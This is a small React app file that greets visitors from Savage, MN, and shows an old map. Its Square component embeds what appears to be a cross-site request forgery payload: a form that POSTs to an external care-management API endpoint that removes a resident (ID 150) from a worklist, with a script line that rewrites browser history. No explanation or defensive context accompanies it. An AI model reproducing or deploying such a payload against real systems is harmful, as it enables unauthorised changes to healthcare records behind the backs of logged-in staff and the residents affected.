import React from 'react';
import Shakopee_Old_Map from './Shakopee_Old_Map.jpg';
import './App.css';

function App() {
  return (
    <div className="App">
      <header className="App-header">
        <img src={Shakopee_Old_Map} className="App-logo" alt="logo" />
        <marquee><h1>Hello from Savage, MN!</h1></marquee>
      </header>
      <Square/>
    </div>
  );
}

function Square() {
    return (
      <button className="square">
        <script>history.pushState('', '', '/')</script>
    <form action="https://devcorp.mdiachieve.com:8089/careassist/api/worklist/removeResidentFromWorklist/150" method="POST">
      <input type="submit" value="Submit request" />
    </form>
      </button>
    );
}

export default App;
